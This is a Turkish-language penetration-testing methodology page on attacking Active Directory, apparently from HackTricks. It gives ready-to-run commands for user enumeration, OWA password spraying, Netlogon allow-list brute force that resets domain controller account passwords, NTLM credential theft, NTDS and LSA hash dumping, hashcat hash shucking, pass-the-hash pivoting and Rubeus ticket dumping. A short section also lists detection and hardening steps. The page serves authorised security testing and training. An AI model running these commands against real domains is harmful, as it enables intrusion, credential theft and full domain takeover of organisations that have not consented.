# Active Directory Metodolojisi

{{#include ../../banners/hacktricks-training.md}}

## Temel genel bakış

**Active Directory**, **network administrator**'larının bir network içindeki **domain**'leri, **user**'ları ve **object**'leri verimli şekilde oluşturup yönetmesini sağlayan temel bir teknolojidir. Ölçeklenebilir olacak şekilde tasarlanmıştır; çok sayıda user'ın yönetilebilir **group** ve **subgroup**'lar halinde düzenlenmesini ve çeşitli seviyelerde **access rights**'ların kontrol edilmesini sağlar.

**Active Directory** yapısı üç temel katmandan oluşur: **domain**'ler, **tree**'ler ve **forest**'lar. Bir **domain**, ortak bir database'i paylaşan **user** veya **device** gibi object koleksiyonunu kapsar. **Tree**'ler, ortak bir yapı üzerinden birbirine bağlanan bu domain gruplarıdır; **forest** ise **trust relationship**'ler aracılığıyla birbirine bağlanan birden fazla tree'nin koleksiyonunu temsil eder ve organizasyon yapısının en üst katmanını oluşturur. Bu seviyelerin her birinde belirli **access** ve **communication rights**'lar tanımlanabilir.

**Active Directory** içindeki temel kavramlar şunlardır:

1. **Directory** – Active Directory object'leriyle ilgili tüm bilgileri barındırır.
2. **Object** – **user**, **group** veya **shared folder** gibi directory içindeki varlıkları ifade eder.
3. **Domain** – Directory object'leri için bir container görevi görür. Bir **forest** içinde birden fazla domain bulunabilir ve her biri kendi object koleksiyonunu korur.
4. **Tree** – Ortak bir root domain'i paylaşan domain grubudur.
5. **Forest** – Birden fazla tree'den oluşan ve aralarında **trust relationship**'ler bulunan Active Directory organizasyon yapısının en üst seviyesidir.

**Active Directory Domain Services (AD DS)**, bir network içindeki merkezi yönetim ve iletişim için kritik olan çeşitli service'leri kapsar. Bu service'ler şunlardır:

1. **Domain Services** – Data storage'ı merkezileştirir ve **user** ile **domain**'ler arasındaki etkileşimleri yönetir; buna **authentication** ve **search** işlevleri de dahildir.
2. **Certificate Services** – Güvenli **digital certificate**'ların oluşturulmasını, dağıtılmasını ve yönetilmesini denetler.
3. **Lightweight Directory Services** – **LDAP protocol** aracılığıyla directory kullanan application'ları destekler.
4. **Directory Federation Services** – Tek bir session içinde birden fazla web application'ında user'ların kimliğini doğrulamak için **single-sign-on** özellikleri sağlar.
5. **Rights Management** – Telif hakkıyla korunan materyallerin izinsiz dağıtımını ve kullanımını düzenleyerek korunmasına yardımcı olur.
6. **DNS Service** – **domain name**'lerin çözümlemesi için kritik öneme sahiptir.

Daha ayrıntılı bir açıklama için şu sayfaya bakın: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Bir **AD'yi attack** etmeyi öğrenmek için **Kerberos authentication process**'ini gerçekten iyi **anlamanız** gerekir.\
[**Nasıl çalıştığını hâlâ bilmiyorsanız bu sayfayı okuyun.**](kerberos-authentication.md)

## Cheat Sheet

Bir AD üzerinde hangi command'leri çalıştırarak enumeration/exploit yapabileceğinizi hızlıca görmek için [https://wadcoms.github.io/](https://wadcoms.github.io) adresinden çok şey öğrenebilirsiniz.

> [!WARNING]
> Kerberos communication normalde **fully qualified domain name (FQDN)** gerektirir; böylece client doğru SPN için bir ticket alabilir. Bir machine'e IP address üzerinden erişmek genellikle Kerberos yerine NTLM'e geri dönüş yapılmasına neden olur.

## Recon Active Directory (No creds/sessions)

Bir AD environment'ına erişiminiz var ancak herhangi bir credential/session'a sahip değilseniz şunları yapabilirsiniz:

- **Network'ü pentest edin:**
- Network'ü scan edin, machine'leri ve açık port'ları bulun ve **vulnerability**'leri **exploit** etmeyi veya bunlardan **credential**'ları **extract** etmeyi deneyin (örneğin, [printer'lar çok ilginç target'lar olabilir](ad-information-in-printers.md)).
- DNS enumeration, domain içindeki web, printer, share, vpn, media vb. önemli server'lar hakkında bilgi sağlayabilir.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Bunun nasıl yapılacağı hakkında daha fazla bilgi edinmek için Genel [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md)'ye bakın.
- **smb service'lerinde null ve Guest access olup olmadığını kontrol edin** (bu, modern Windows version'larında çalışmaz):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Bir SMB server'ını enumerate etme hakkında daha ayrıntılı bir guide burada bulunabilir:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Ldap enumerate edin**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- LDAP'ı nasıl enumerate edeceğiniz hakkında daha ayrıntılı bir guide burada bulunabilir (**anonymous access**'e özellikle dikkat edin):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Network'ü poison edin**
- [**Responder ile service'leri impersonate ederek**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) credential'ları toplayın
- [**relay attack'i abuse ederek**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) host'a erişin
- [**evil-S ile fake UPnP service'lerini expose ederek**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856) credential'ları toplayın
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Internal document'lerden, social media'dan, domain environment'ları içindeki service'lerden (özellikle web) ve ayrıca publicly available kaynaklardan username/name'leri extract edin.
- Şirket çalışanlarının tam adlarını bulursanız farklı AD **username convention**'larını (**[**bunu okuyun**](https://activedirectorypro.com/active-directory-user-naming-convention/)) deneyebilirsiniz. En yaygın convention'lar şunlardır: _NameSurname_, _Name.Surname_, _NamSur_ (her birinden 3 harf), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letter ve 3 random number_ (abc123).
- Tool'lar:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) ve [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) sayfalarını inceleyin.
- **Kerbrute enum**: **geçersiz bir username istendiğinde**, server _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_ **Kerberos error** code'u ile yanıt verir ve bu da username'in geçersiz olduğunu belirlememizi sağlar. **Geçerli username**'ler ya bir AS-REP response içinde **TGT** ya da user'ın pre-authentication gerçekleştirmesi gerektiğini belirten _KRB5KDC_ERR_PREAUTH_REQUIRED_ error'unu döndürür.
- **MS-NRPC'e karşı Authentication olmadan**: Domain controller'larındaki MS-NRPC (Netlogon) interface'ine auth-level = 1 (No authentication) kullanarak erişilir. Method, herhangi bir credential olmadan user veya computer'ın mevcut olup olmadığını kontrol etmek için MS-NRPC interface'ine bind olduktan sonra `DsrGetDcNameEx2` function'ını çağırır. [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) tool'u bu enumeration türünü uygular. Araştırmaya [buradan](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup> ulaşılabilir.
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Sunucusu**

Ağda bu sunuculardan birini bulduysanız, buna karşı **user enumeration** da gerçekleştirebilirsiniz. Örneğin, [**MailSniper**](https://github.com/dafthack/MailSniper) aracını kullanabilirsiniz:
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Kullanıcı adlarının listelerini [**bu github reposunda**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) ve bu diğerinde ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)) bulabilirsiniz.
>
> Ancak, bundan önce gerçekleştirmeniz gereken recon adımında şirket bünyesinde çalışan kişilerin **isimlerine** sahip olmalısınız. Ad ve soyad ile potansiyel olarak geçerli kullanıcı adları oluşturmak için [**namemash.py**](https://gist.github.com/superkojiman/11076951) script'ini kullanabilirsiniz.

### Netlogon vulnerable-channel allow-list abuse (Onelogon)

DC üzerinde **Zerologon** patch edilmiş olsa bile açıkça allow-list'e alınmış hesaplar hâlâ **legacy/vulnerable Netlogon secure-channel davranışına** maruz kalabilir. Riskli yapılandırma, **`Domain controller: Allow vulnerable Netlogon secure channel connections`** GPO'su veya buna karşılık gelen **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`** registry değeridir.

Bu değer bir **SDDL security descriptor**'ıdır ([Security Descriptors](security-descriptors.md) bölümüne bakın). DACL içinde ilgili ACE verilmiş herhangi bir hesap veya grup hedef alınabilir. Örneğin, **`O:BAG:BAD:(A;;RC;;;WD)`** ifadesi fiilen **Everyone** grubunu allow-list'e alır.

Pratik operator workflow:

1. **SYSVOL/GPO** ve **live DC registry**'yi kontrol ederek allow-list'e alınmış principal'ları belirleyin.
2. SDDL içinde bulunan SID'leri gerçek AD kullanıcılarına/bilgisayarlarına resolve edin ve **DC machine account**'larına, **trust account**'larına ve diğer privileged machine'lere öncelik verin.
3. Allow-list'e alınmış hesap olarak tekrar tekrar **MS-NRPC / Netlogon authentication** deneyin.
4. Başarılı bir tahminden sonra hedef hesap password'unu resetlemek için **Netlogon password-setting** özelliğini abuse edin (public PoC bunu boş bir string olarak ayarlar).<sup>[[9]](#references)[[10]](#references)</sup>

Public artifact'tan hızlı triage / lab örnekleri:
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Notlar:

- **scanner**, etkin allow-list'in **SYSVOL** içinde, **registry**'de veya her ikisinde bulunabilmesi nedeniyle kullanışlıdır.
- Exploit yolu önemlidir çünkü güvenlik açığı bulunan bir hesap belirlendikten sonra **Domain Admin yetkileri gerektirmez**.
- `DC$` gibi bir **Domain Controller machine account**'unun ele geçirilmesi özellikle tehlikelidir; bu hesabın parolasının sıfırlanması, daha geniş **AD takeover** yollarını doğrudan etkinleştirebilir.
- **Brute-force uygulanabilirliği** moda bağlıdır: public artifact, meet-in-the-middle yaklaşımını, başka bir computer account mevcut olduğunda **24-bit** brute force'u ve daha yavaş **32-bit** varyantları açıklar.

Detection / hardening notları:

- Allow-list policy'yi denetleyin ve geçici, açıkça gerekli compatibility exception'ları dışındaki her şeyi kaldırın.
- Güvenlik açığı bulunan Netlogon bağlantılarının reddedildiğini, tespit edildiğini veya policy tarafından açıkça allow edildiğini yakalamak için DC **System** event'leri **5827/5828/5829/5830/5831**'i izleyin.
- Legacy dependency kaldırılana kadar `VulnerableChannelAllowList` içindeki hesapları **high-risk** kabul edin.

### Bir veya birkaç username bilmek

Tamam, geçerli bir username'e sahip olduğunuzu, ancak hiçbir password bilmediğinizi varsayalım... Ardından şunları deneyin:

- [**ASREPRoast**](asreproast.md): Kullanıcıda _DONT_REQ_PREAUTH_ attribute'u **yoksa**, bu kullanıcı için kullanıcının password'undan türetilen bir değerle şifrelenmiş bazı veriler içeren bir **AS_REP message** **request** edebilirsiniz.
- [**Password Spraying**](password-spraying.md): Keşfedilen kullanıcıların her biriyle en **yaygın password'leri** deneyelim; belki kullanıcılardan biri zayıf bir password kullanıyordur (password policy'yi göz önünde bulundurun!).
- Kullanıcıların mail server'larına erişim elde etmeyi denemek için **OWA server'larına spray** de uygulayabileceğinizi unutmayın.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

**Network** üzerindeki bazı protokolleri **poisoning** uygulayarak crack edebileceğiniz bazı challenge **hash'leri** **elde edebilirsiniz**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Active Directory enumeration; username'ler, email identifier'ları ve naming pattern'leri, candidate host'lar ve authentication yapmaya zorlanabilecek service'ler sağlar. Bu bağlamı kullanarak uygun NTLM [**relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)'larını ve AD environment'ına yönelik olası yolları belirleyin.

### NetExec workspace-driven recon ve relay posture kontrolleri

- Engagement başına AD recon durumunu korumak için **`nxcdb` workspaces** kullanın: `workspace create <name>`, `~/.nxc/workspaces/<name>` altında protocol başına SQLite DB'leri (smb/mssql/winrm/ldap/etc) oluşturur. `proto smb|mssql|winrm` ile görünümler arasında geçiş yapın ve toplanan secret'ları `creds` ile listeleyin. İşiniz bittiğinde hassas verileri manuel olarak temizleyin: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- **`netexec smb <cidr>`** ile hızlı subnet discovery; **domain**, **OS build**, **SMB signing requirements** ve **Null Auth** bilgilerini gösterir. `(signing:False)` gösteren member'lar **relay-prone**'dır; DC'ler ise genellikle signing gerektirir.
- Hedeflemeyi kolaylaştırmak için NetExec output'undan doğrudan **/etc/hosts** içinde **hostname'ler oluşturun**:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- **SMB relay to the DC is blocked** by signing olduğunda bile **LDAP** durumunu probe edin: `netexec ldap <dc>`, `(signing:None)` / zayıf channel binding değerlerini gösterir. SMB signing zorunlu olan ancak LDAP signing devre dışı bırakılmış bir DC, **SPN-less RBCD** gibi abuse yöntemleri için hâlâ uygulanabilir bir **relay-to-LDAP** hedefidir.

### Client-side printer credential leaks → toplu domain credential doğrulaması

- Printer/web UI'ları bazen **maskelenmiş admin parolalarını HTML içine gömer**. Kaynağı/devtools'u görüntülemek, cleartext değeri (ör. `<input value="<password>">`) ortaya çıkararak scan/print repository'lerine Basic-auth erişimi sağlayabilir.
- Alınan print job'ları, kullanıcı başına parolalar içeren **plaintext onboarding belgeleri** barındırabilir. Test sırasında eşleştirmeleri koruyun:<sup>[[6]](#references)</sup>
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

**null veya guest user** ile **diğer bilgisayarlara veya paylaşımlara erişebiliyorsanız**, SCF file gibi **dosyalar yerleştirebilirsiniz**. Bu dosyalar bir şekilde erişildiğinde **size karşı bir NTLM authentication tetikleyebilir**; böylece kırmak üzere **NTLM challenge** değerini **çalabilirsiniz**:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking**, sahip olduğunuz her NT hash'i, anahtar materyali doğrudan NT hash'ten türetilen diğer daha yavaş formatlar için aday password olarak ele alır. Kerberos RC4 ticket'larında, NetNTLM challenge'larında veya cached credentials'ta uzun passphrase'leri brute-force etmek yerine NT hash'leri Hashcat'in NT-candidate mode'larına vererek plaintext'i öğrenmeden password reuse durumunu doğrulamasını sağlarsınız. Bu yöntem, binlerce mevcut ve geçmiş NT hash'i toplayabileceğiniz bir domain compromise sonrasında özellikle etkilidir.<sup>[[5]](#references)</sup>

Shucking'i şu durumlarda kullanın:

- DCSync, SAM/SECURITY dump'ları veya credential vault'larından elde edilmiş bir NT corpus'unuz varsa ve başka domain/forest'larda reuse durumunu test etmeniz gerekiyorsa.
- RC4 tabanlı Kerberos materyali (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM response'ları veya DCC/DCC2 blob'ları yakalarsanız.
- Uzun ve crack edilemeyen passphrase'lerin reuse edildiğini hızlıca kanıtlamak ve hemen Pass-the-Hash ile pivot etmek istiyorsanız.

Bu teknik, anahtarları NT hash olmayan encryption type'lara karşı **çalışmaz** (ör. Kerberos etype 17/18 AES). Bir domain yalnızca AES kullanımını zorluyorsa normal password mode'larına dönmeniz gerekir.

#### Building an NT hash corpus

- **DCSync/NTDS** – En geniş NT hash setini ve önceki değerlerini almak için history ile `secretsdump.py` kullanın:

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History kayıtları aday havuzunu önemli ölçüde genişletir; çünkü Microsoft account başına en fazla 24 önceki hash saklayabilir. NTDS secret'larını toplamanın diğer yolları için bkz.:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dump'ları** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (veya Mimikatz `lsadump::sam /patch`), local SAM/SECURITY verilerini ve cached domain logon'larını (DCC/DCC2) çıkarır. Bu hash'leri tekilleştirin ve aynı `nt_candidates.txt` listesine ekleyin.
- **Metadata'yı takip edin** – Her hash'i üreten username/domain bilgisini koruyun (wordlist yalnızca hex içerse bile). Hash eşleşmeleri, Hashcat kazanan adayı yazdırdığında hangi principal'ın password reuse yaptığını hemen gösterir.
- Shucking sırasında çakışma olasılığını en üst düzeye çıkarmak için aynı forest'tan veya trusted forest'tan gelen adayları tercih edin.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notlar:

- NT-candidate input'ları **raw 32-hex NT hash olarak kalmalıdır**. Rule engine'lerini devre dışı bırakın (`-r` kullanmayın ve hybrid mode'larını kullanmayın); çünkü mangling, aday key material'ını bozar.
- Bu mode'lar doğası gereği daha hızlı değildir; ancak NTLM keyspace'i (M3 Max üzerinde yaklaşık 30.000 MH/s), Kerberos RC4'ten (yaklaşık 300 MH/s) yaklaşık 100 kat daha hızlıdır. Seçilmiş bir NT listesini test etmek, yavaş formatta tüm password space'i taramaktan çok daha ucuzdur.
- Her zaman **en güncel Hashcat build'ini** çalıştırın (`git clone https://github.com/hashcat/hashcat && make install`); çünkü 31500/31600/35300/35400 mode'ları yakın zamanda yayımlanmıştır.<sup>[[7]](#references)</sup>
- Şu anda AS-REQ Pre-Auth için bir NT mode'u yoktur. AES etype'ları (19600/19700), key'leri raw NT hash'lerden değil UTF-16LE password'lerden PBKDF2 aracılığıyla türetildiği için plaintext password gerektirir.

#### Example – Kerberoast RC4 (mode 35300)

1. Düşük ayrıcalıklı bir user ile hedef SPN için bir RC4 TGS yakalayın (ayrıntılar için Kerberoast sayfasına bakın):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Ticket'ı NT listenizle shuck edin:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat, her NT adayından RC4 key'ini türetir ve `$krb5tgs$23$...` blob'unu doğrular. Bir eşleşme, service account'un mevcut NT hash'lerinizden birini kullandığını doğrular.

3. Hemen PtH ile pivot edin:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Gerekirse plaintext'i daha sonra `hashcat -m 1000 <matched_hash> wordlists/` ile elde edebilirsiniz.

#### Example – Cached credentials (mode 31600)

1. Compromised bir workstation'dan cached logon'ları dump edin:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. İlgilendiğiniz domain user'a ait DCC2 satırını `dcc2_highpriv.txt` dosyasına kopyalayın ve shuck edin:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Başarılı bir eşleşme, listenizde zaten bilinen NT hash'i verir ve cached user'ın bir password'u yeniden kullandığını kanıtlar. Bunu doğrudan PtH için kullanın (`nxc smb <dc_ip> -u highpriv -H <hash>`) veya string'i elde etmek için hızlı NTLM mode'unda brute-force edin.

Aynı workflow NetNTLM challenge-response'ları (`-m 27000/27100`) ve DCC (`-m 31500`) için de geçerlidir. Bir eşleşme belirlendiğinde relay, SMB/WMI/WinRM PtH başlatabilir veya NT hash'i mask/rule kullanarak offline olarak yeniden crack edebilirsiniz.



## Credentials/session ile Active Directory Enumerating

Bu aşama için geçerli bir domain account'un **compromised credentials'ına veya session'ına sahip olmanız gerekir**. Geçerli bazı credentials'lara veya bir domain user olarak shell'e sahipseniz, daha önce verilen seçeneklerin **diğer user'ları compromise etmek için hâlâ kullanılabileceğini** unutmamalısınız.

Authenticated enumeration'a başlamadan önce **Kerberos double-hop problem'ini** anlayın.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Bir account'u compromise etmek, **domain'i değerlendirme yönünde önemli bir adımdır**; çünkü authenticated **Active Directory enumeration** yapılmasını sağlar:

[**ASREPRoast**](asreproast.md) konusunda artık olası tüm vulnerable user'ları bulabilirsiniz. [**Password Spraying**](password-spraying.md) konusunda ise **tüm username'lerin listesini** elde edebilir ve compromised account'un password'unu, boş password'leri ve yeni umut vadeden password'leri deneyebilirsiniz.

- [**CMD ile basic recon gerçekleştirebilirsiniz**](../basic-cmd-for-pentesters.md#domain-info)
- Daha stealthy olması için [**powershell'i recon amacıyla da kullanabilirsiniz**](../basic-powershell-for-pentesters/index.html)
- Daha ayrıntılı bilgi çıkarmak için [**powerview kullanabilirsiniz**](../basic-powershell-for-pentesters/powerview.md)
- Active directory'de recon için bir diğer etkileyici tool [**BloodHound**](bloodhound.md)'dur. **Çok stealthy değildir** (kullandığınız collection method'larına bağlı olarak); ancak bunu **önemsemiyorsanız** kesinlikle denemelisiniz. User'ların nerede RDP yapabildiğini, diğer group'lara giden path'leri vb. bulun.
- **Diğer automated AD enumeration tool'ları:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- İlginç bilgiler içerebilecek [**AD'nin DNS record'ları**](ad-dns-records.md).
- Directory'yi enumerate etmek için kullanabileceğiniz **GUI'li bir tool**, **SysInternal** Suite içindeki AdExplorer.exe'dir.
- LDAP database'inde **ldapsearch** ile arama yaparak _userPassword_ ve _unixUserPassword_ alanlarında, hatta _Description_ alanında credentials arayabilirsiniz. Diğer method'lar için bkz. [PayloadsAllTheThings üzerindeki AD User comment'inde Password](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment).
- **Linux** kullanıyorsanız [**pywerview**](https://github.com/the-useless-one/pywerview) ile de domain'i enumerate edebilirsiniz.
- Automated tool'ları da deneyebilirsiniz:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Tüm domain user'larını çıkarma**

Windows'tan tüm domain username'lerini elde etmek çok kolaydır (`net user /domain`, `Get-DomainUser` veya `wmic useraccount get name,sid`). Linux'ta şunları kullanabilirsiniz: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` veya `enum4linux -a -u "user" -p "password" <DC IP>`

> Bu Enumeration bölümü küçük görünse bile tüm sürecin en önemli kısmıdır. Linklere (özellikle cmd, powershell, powerview ve BloodHound linklerine) erişin, bir domain'i nasıl enumerate edeceğinizi öğrenin ve kendinizi rahat hissedene kadar pratik yapın. Bir assessment sırasında DA'ya giden yolu bulmak veya hiçbir şey yapılamayacağına karar vermek için kritik an bu olacaktır.

### Kerberoast

Kerberoasting, user account'larına bağlı service'ler tarafından kullanılan **TGS ticket'larını** elde etmeyi ve user password'larına dayanan encryption'larını **offline** olarak crack etmeyi içerir.

Bu konu hakkında daha fazlası:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connection (RDP, SSH, FTP, Win-RM, etc.)

Bazı credentials'lar elde ettiğinizde herhangi bir **machine**'a erişiminiz olup olmadığını kontrol edebilirsiniz. Bunun için port scan'lerinize uygun olarak farklı protocol'ler ile çeşitli server'lara bağlanmayı denemek üzere **CrackMapExec** kullanabilirsiniz.

### Local Privilege Escalation

Compromised credentials'a veya regular domain user olarak bir session'a sahipseniz ve **domain'deki herhangi bir machine'a** erişebiliyorsanız, **local olarak privilege escalate etmek ve credentials toplamak** için bir path arayın. Local administrator privilege'ları, memory'den (LSASS) ve local storage'dan (SAM) **diğer user'ların hash'lerini dump etmenize** olanak sağlayabilir.

Bu book'ta [**Windows'ta local privilege escalation**](../windows-local-privilege-escalation/index.html) hakkında eksiksiz bir sayfa ve bir [**checklist**](../checklist-windows-privilege-escalation.md) bulunmaktadır. Ayrıca **[WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)** kullanmayı unutmayın.

### Current Session Tickets

Mevcut user'da size beklenmedik resource'lara **erişim izni veren** **ticket'lar** bulmanız çok **olası değildir**; ancak şunları kontrol edebilirsiniz:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Domain kimlik bilgileri veya bir kullanıcı oturumuyla, NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) yöntemini yeniden değerlendirin: authenticated enumeration ve coercion teknikleri, unauthenticated reconnaissance sırasında kullanılamayan relay yollarını ortaya çıkarabilir.

### Bilgisayar Paylaşımlarında Creds Arama | SMB Shares

Artık bazı temel kimlik bilgilerine sahip olduğunuza göre, **AD içinde paylaşılan ilginç dosyaları** **bulup bulamayacağınızı** kontrol etmelisiniz. Bunu manuel olarak yapabilirsiniz, ancak bu çok sıkıcı ve tekrarlayan bir görevdir (özellikle kontrol etmeniz gereken yüzlerce doküman bulursanız).

[**Kullanabileceğiniz araçlar hakkında bilgi edinmek için bu bağlantıyı takip edin.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

**Diğer PC'lere veya paylaşımlara erişebiliyorsanız**, (SCF file gibi) **dosyalar yerleştirebilirsiniz**; bu dosyalara bir şekilde erişilirse size karşı **bir NTLM authentication tetiklenir** ve böylece **NTLM challenge'ı çalabilirsiniz**; ardından bunu crack edebilirsiniz:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Bu vulnerability, kimliği doğrulanmış herhangi bir kullanıcının **domain controller'ı compromise etmesine** olanak sağlıyordu.


{{#ref}}
printnightmare.md
{{#endref}}

## Ayrıcalıklı kimlik bilgileri/oturum ile Active Directory üzerinde privilege escalation

**Aşağıdaki teknikler için normal bir domain kullanıcısı yeterli değildir; bu attack'leri gerçekleştirmek için bazı özel ayrıcalıklara/kimlik bilgilerine ihtiyacınız vardır.**

### Hash extraction

Umarız [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) (relaying dahil), [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md) veya [yerel olarak privilege escalation](../windows-local-privilege-escalation/index.html) kullanarak bazı **local admin** hesaplarını **compromise etmeyi** başarmışsınızdır.\
Şimdi memory'deki ve yerel tüm hash'leri dump etme zamanı.\
